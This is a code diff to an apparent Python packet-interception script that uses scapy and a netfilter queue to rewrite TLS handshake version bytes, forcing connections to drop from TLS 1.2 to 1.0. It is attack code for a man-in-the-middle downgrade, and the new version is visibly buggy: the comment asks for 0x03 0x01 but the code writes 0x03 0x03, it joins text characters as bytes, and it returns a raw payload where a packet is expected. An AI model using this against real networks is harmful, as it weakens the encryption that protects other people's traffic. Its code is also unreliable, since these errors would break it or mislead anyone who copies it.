@@ -41,15 +41,8 @@ def processPacket(packet):
         print("TLS v1.2, dropping down to v1.0")
         print(scapy_packet.command())
 
-        try:
-          scapy_packet = downgradeTLS(scapy_packet)
-        except IndexError:
-          # Something failed.
-          pass
-     
-        print("Here's the output:")
-        print(scapy_packet.command())
-        
+        scapy_packet = downgradeTLS(scapy_packet)
+             
         # set back as netfilter queue packet
         packet.set_payload(bytes(scapy_packet))      
         
@@ -62,17 +55,19 @@ def processPacket(packet):
 
 
 def downgradeTLS(scapy_packet):
-  print("Position [61][62] was: ", scapy_packet[61], scapy_packet[62], ". Needs to change to 0x03 0x01.")
-
-  scapy_packet[61] = '\x03'
-  scapy_packet[62] = '\x01'
-
-  print("Position [61][62] is now: ", scapy_packet[61], scapy_packet[62], ".")
-  
   del scapy_packet["IP"].chksum
   del scapy_packet["TCP"].chksum
 
-  return scapy_packet
+  rawPayload = [b for b in scapy_packet["Raw"].load]
+  print("Position [9][10] was: ", rawPayload[9], rawPayload[10], ". Needs to change to 0x03 0x01.")
+
+  rawPayload[9] = '\x03'
+  rawPayload[10] = '\x03'
+
+  print("Position [9][10] is now: ", rawPayload[9], rawPayload[10], ".")
+  
+  payload = b''.join(rawPayload)
+  return payload
 
 
 
